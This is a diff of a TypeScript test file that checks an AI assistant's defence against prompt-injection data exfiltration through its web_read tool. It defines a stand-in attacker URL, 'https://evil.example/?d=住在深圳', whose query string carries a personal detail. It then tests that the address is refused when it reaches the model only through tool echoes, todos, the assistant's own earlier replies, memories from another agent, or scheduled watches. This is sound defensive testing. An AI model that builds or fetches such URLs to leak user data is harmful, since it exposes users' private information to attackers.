@@ -1,6 +1,7 @@
 import { describe, expect, it } from "vitest";
 import { z } from "zod";
 import { systemPrompt } from "../src/core/agent.js";
+import type { Moqi } from "../src/core/moqi.js";
 import { defineTool, type Plugin } from "../src/core/plugin.js";
 import { UNSEEN_ADDRESS } from "../src/core/sites.js";
 import { SEARCH, searchPlugin, searchService } from "../src/plugins/search.js";
@@ -289,34 +290,62 @@ describe("the chat prompt", () => {
 });
 
 describe("web_read after outside content", () => {
+  const EVIL = "https://evil.example/?d=住在深圳";
+
   /** One turn: the model makes these calls in order, then answers. Returns what each call gave the model. */
-  async function turn(userText: string, calls: ReturnType<typeof call>[], pages: Record<string, string> = {}) {
+  async function turn(
+    userText: string,
+    calls: ReturnType<typeof call>[],
+    pages: Record<string, string> = {},
+    options: {
+      readonly before?: (moqi: Moqi) => void;
+      readonly how?: { readonly fromAgent?: boolean };
+    } = {},
+  ) {
     const n = net((url, body) => {
       if (url === DS_SEARCH) return Response.json({ results: [hit(1)] });
       const page = (body as { url: string }).url;
       return Response.json({ title: "页", content: pages[page] ?? "正文" });
     });
     const model = scriptedModel((r) => calls[r.messages.filter((m) => m.role === "tool").length] ?? "好了");
-    const { moqi } = harness({ plugins: [searchPlugin({ provider: "deepseek", apiKey: "k", fetch: n.fetch })], model });
-    await moqi.chat(userText);
+    const { moqi, asked } = harness({
+      plugins: [searchPlugin({ provider: "deepseek", apiKey: "k", fetch: n.fetch })],
+      model,
+    });
+    options.before?.(moqi);
+    await moqi.chat(userText, undefined, options.how);
     const results = (model.requests.at(-1)?.messages ?? []).filter((m) => m.role === "tool").map(words);
     const read = n.sent.filter((s) => s.url === DS_FETCH).map((s) => (s.body as { url: string }).url);
-    return { results, read };
+    return { results, read, asked, moqi };
   }
 
   it("reads a search result and a link on a page it read, but not an address put together", async () => {
-    const { results, read } = await turn(
+    const { results, read, asked } = await turn(
       "搜一下",
       [
         call("web_search", { query: "x" }, "c1"),
         call("web_read", { url: "https://news.example/1" }, "c2"),
         call("web_read", { url: "https://news.example/2" }, "c3"),
-        call("web_read", { url: "https://evil.example/?d=住在深圳" }, "c4"),
+        call("web_read", { url: EVIL }, "c4"),
       ],
       { "https://news.example/1": "[下一页](https://news.example/2)" },
     );
     expect(read).toEqual(["https://news.example/1", "https://news.example/2"]);
     expect(results[3]).toBe(UNSEEN_ADDRESS);
+    expect(asked).toEqual([]);
+  });
+
+  it("follows a link that extends the address it read", async () => {
+    const { read } = await turn(
+      "搜一下",
+      [
+        call("web_search", { query: "x" }, "c1"),
+        call("web_read", { url: "https://news.example/1" }, "c2"),
+        call("web_read", { url: "https://news.example/1/more" }, "c3"),
+      ],
+      { "https://news.example/1": "[全文](https://news.example/1/more)" },
+    );
+    expect(read).toEqual(["https://news.example/1", "https://news.example/1/more"]);
   });
 
   it("reads an address from the user's own message after outside content", async () => {
@@ -330,5 +359,134 @@ describe("web_read after outside content", () => {
   it("reads any address before the turn read outside content", async () => {
     const { read } = await turn("随便看看", [call("web_read", { url: "https://any.example/x" }, "c1")]);
     expect(read).toEqual(["https://any.example/x"]);
+  });
+
+  it("does not count an address a tool only echoed back from the model's own arguments", async () => {
+    const { results, read } = await turn("搜一下", [
+      call("web_search", { query: "x" }, "c1"),
+      call("todo_done", { id: EVIL }, "c2"),
+      call("web_read", { url: EVIL }, "c3"),
+    ]);
+    expect(results[1]).toContain(EVIL); // the echo is there for the model to see
+    expect(results[2]).toBe(UNSEEN_ADDRESS);
+    expect(read).toEqual([]);
+  });
+
+  it("does not count an address the model wrote into a todo and read back", async () => {
+    const { results, read } = await turn("搜一下", [
+      call("web_search", { query: "x" }, "c1"),
+      call("todo_add", { text: `看看 ${EVIL}` }, "c2"),
+      call("todo_list", {}, "c3"),
+      call("web_read", { url: EVIL }, "c4"),
+    ]);
+    expect(results[2]).toContain(EVIL);
+    expect(results[3]).toBe(UNSEEN_ADDRESS);
+    expect(read).toEqual([]);
+  });
+
+  it("counts the user's earlier messages, not moqi's earlier answers", async () => {
+    const { results, read } = await turn(
+      "搜一下",
+      [
+        call("web_search", { query: "x" }, "c1"),
+        call("web_read", { url: "https://mine.example/said" }, "c2"),
+        call("web_read", { url: "https://evil.example/answered" }, "c3"),
+      ],
+      {},
+      {
+        before: (moqi) => {
+          moqi.emit({ type: "message", role: "user", text: "记得看 https://mine.example/said" });
+          moqi.emit({ type: "message", role: "assistant", text: "好的，https://evil.example/answered" });
+        },
+      },
+    );
+    expect(read).toEqual(["https://mine.example/said"]);
+    expect(results[2]).toBe(UNSEEN_ADDRESS);
+  });
+
+  it("counts the user's own memories, not ones that came from outside", async () => {
+    const { results, read } = await turn(
+      "搜一下",
+      [
+        call("web_search", { query: "x" }, "c1"),
+        call("web_read", { url: "https://mine.example/blog" }, "c2"),
+        call("web_read", { url: "https://agent.example/said" }, "c3"),
+      ],
+      {},
+      {
+        before: (moqi) => {
+          moqi.remember({ kind: "other", content: "博客在 https://mine.example/blog" });
+          moqi.remember({ kind: "other", content: "常看 https://agent.example/said", by: "kiro-cli" });
+        },
+      },
+    );
+    expect(read).toEqual(["https://mine.example/blog"]);
+    expect(results[2]).toBe(UNSEEN_ADDRESS);
+  });
+
+  it("sends the address as it was compared, without the # part or dot segments", async () => {
+    const { read } = await turn("搜一下", [
+      call("web_search", { query: "x" }, "c1"),
+      call("web_read", { url: "https://news.example/1#住在深圳" }, "c2"),
+      call("web_read", { url: "https://news.example/x/../1" }, "c3"),
+    ]);
+    expect(read).toEqual(["https://news.example/1", "https://news.example/1"]);
+  });
+
+  it("reads at most 5 pages after outside content in one turn", async () => {
+    // One reply may hold many calls: the refused one first (not counted), then six that may be read.
+    const many = {
+      content: "",
+      toolCalls: [EVIL, ...Array<string>(6).fill("https://news.example/1")].map((url, i) => ({
+        id: `r${i}`,
+        name: "web_read",
+        arguments: { url },
+      })),
+    };
+    const { results, read } = await turn("搜一下", [call("web_search", { query: "x" }, "c1"), many]);
+    expect(results[1]).toBe(UNSEEN_ADDRESS);
+    expect(read).toHaveLength(5);
+    expect(results[7]).toBe("没有读：这一轮读到外部内容之后已经读了 5 个网页，不再读了。要接着读，请用户再说一声。");
+  });
+
+  it("does not let a watch carry an address the turn has not seen", async () => {
+    const watch = (url: string, id: string) =>
+      call(
+        "watch_create",
+        { title: "看看", schedule: { every: "day", at: "08:00" }, tool: "web_read", args: { url } },
+        id,
+      );
+    const refused = await turn("搜一下", [call("web_search", { query: "x" }, "c1"), watch(EVIL, "c2")]);
+    expect(refused.results[1]).toBe(UNSEEN_ADDRESS);
+    expect(refused.asked).toEqual([]);
+    expect(refused.moqi.state.watches.size).toBe(0);
+
+    const seen = await turn("搜一下", [
+      call("web_search", { query: "x" }, "c1"),
+      watch("https://news.example/1#x", "c2"),
+    ]);
+    expect(seen.asked).toHaveLength(1);
+    expect([...seen.moqi.state.watches.values()]).toMatchObject([
+      { check: { args: { url: "https://news.example/1" } } },
+    ]);
+  });
+
+  it("reads any address outside a conversation turn", async () => {
+    const n = net(() => Response.json({ title: "页", content: "正文" }));
+    const { moqi } = harness({ plugins: [searchPlugin({ provider: "deepseek", apiKey: "k", fetch: n.fetch })] });
+    await moqi.callTool("web_read", { url: EVIL }, { byUser: true });
+    await moqi.callTool("web_read", { url: EVIL }, { byUser: true, tainted: true });
+    expect(n.sent.map((s) => (s.body as { url: string }).url)).toEqual([EVIL, EVIL]);
+  });
+
+  it("in a turn another agent wrote, reads only the addresses in its message", async () => {
+    const { results, read } = await turn(
+      "看看 https://agent.example/page",
+      [call("web_read", { url: "https://agent.example/page" }, "c1"), call("web_read", { url: EVIL }, "c2")],
+      {},
+      { how: { fromAgent: true } },
+    );
+    expect(read).toEqual(["https://agent.example/page"]);
+    expect(results[1]).toBe(UNSEEN_ADDRESS);
   });
 });
